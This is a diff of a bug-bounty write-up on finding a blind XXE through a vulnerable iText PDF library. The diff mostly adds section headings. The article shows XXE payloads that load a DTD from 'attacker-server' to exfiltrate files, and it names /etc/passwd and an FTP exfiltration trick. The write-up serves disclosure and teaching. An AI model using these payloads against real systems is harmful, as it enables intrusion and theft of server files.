@@ -20,6 +20,8 @@ This article explains how I found a Blind XXE via a version of iText which was v
 
 ---
 
+### Mapping phase
+
 My style of hacking is a bit feature-oriented, if I see something interesting or several moving parts working based on a particular functionality, I'm investing my time there. This time I was facing a web application that handles different documents like pictures, .xls and PDF files... Whenever I see some things going on with PDF files I'm definitely taking a look at it. 
 
 There was an upload feature that allowed certain file types: png, jpg, xls, pdf, zip and some others. Uploading images seemed totally fine, clicking on its settings did not show anything interesting either. Then I selected two images and clicked the same settings button (hamburger icon), suddenly a new option showed up: "Merge files". This option combined the two images and embedded them into a single PDF file... Can you smell that right? 
@@ -49,7 +51,9 @@ Anyway, by looking for iText vulns the first google entry pointed me to a High r
 
 <b>Crafted PDF</b>... cool, this involves some kind of tweak to a PDF file. Some dorks here and there I ran into a [Github repo](https://github.com/jakabakos/CVE-2017-9096-iText-XXE) with working steps to exploit this CVE.
 
-Followed every step, inserted an XXE code: 
+### Exploitation phase
+
+I went and followed every step, inserted a test XXE code: 
 
 ```html
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collab">]>
@@ -57,7 +61,7 @@ Followed every step, inserted an XXE code:
 
 to initally test for an SSRF on the suggested lines, uploaded it to the app and waited for a ping back to my collaborator... Nada... It has to be vulnerable right? Embedding the payload on different sections of the PDF file did nothing different. Changing the controlled host for some other just in case they had a blacklist on [well known OOB domains](https://x.com/saur1n/status/1888591256957210864) but still nothing.
 
-By looking at the sample PDF file used for this exploit with nano (I use nano btw) I had to find some other place to insert the code, searching for the string `<?xml` gave me some matches but on line 741 I saw this:
+By looking at the sample PDF file used for this exploit with nano (I use nano btw...) I had to find some other place to insert the code, searching for the string `<?xml` gave me some matches but on line 741 I saw this:
 
 <img src="/nano.png" alt="pdf metadata" width="800" height="300" />
 
@@ -69,11 +73,13 @@ Alright, let's place it on line 742 then... Uploaded it... and ... wait for it..
 
 So yeah, it was in fact a vulnerable iText version to XXE, BUT, that version of Java set me off a little... it was a pretty updated one, and to be honest I didn't want to think it through, trying to stay positive. Well, as always it was time to escalate the bug.
 
+### Escalation phase
+
 Due to the nature of the feature, no direct feedback was available after every upload, therefore an error based XXE was not possible, so I had to go with the Blind route using Out-of-Band attacks to try to exfiltrate internal information.
 
 I had to try different variations of External Parameter entities (an entity referenced inside the DTD). After some trial and error I came up with two working payloads:
 
-#### 1st. payload:
+#### 1st. payload
 
 ```xml
 <!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://attacker-server/poc.dtd">
@@ -93,7 +99,7 @@ The first payload is what I inserted in the PDF file:
 
 At this point, the vulnerable server makes an outbound HTTP request to the attacker's server to download poc.dtd. 
 
-#### 2nd. payload:
+#### 2nd. payload
 
 The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual exfiltration code:
 
@@ -126,7 +132,7 @@ FUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU!!
 
 And just like that I successfully exfiltrated an internal filesystem from the AWS instance. Great, let's try something more sensitive `/etc/passwd`:
 
-NADA... I tried with different files but still nothing was returned to my collaborator instance... OK, until this point I'd read a ton of writeups about XXE on Java applications and I knew I was facing the line termination (multiline files) restriction, so only single line files could be read out.
+No luck... The call to my collaborator was empty. I tried with different files but still nothing was returned to my collaborator instance... OK, until this point I'd read a ton of writeups about XXE on Java applications and I knew I was facing the line termination (multiline files) restriction, so only single line files could be read out.
 
 Time to pull out the FTP trick to exfil mutiline files (thanks to Novikov). I found a [script](https://github.com/lc/230-OOB/blob/master/230.py) created by [Corben Leo](https://x.com/hacker_) that emulates an FTP server for OOB attacks.
 
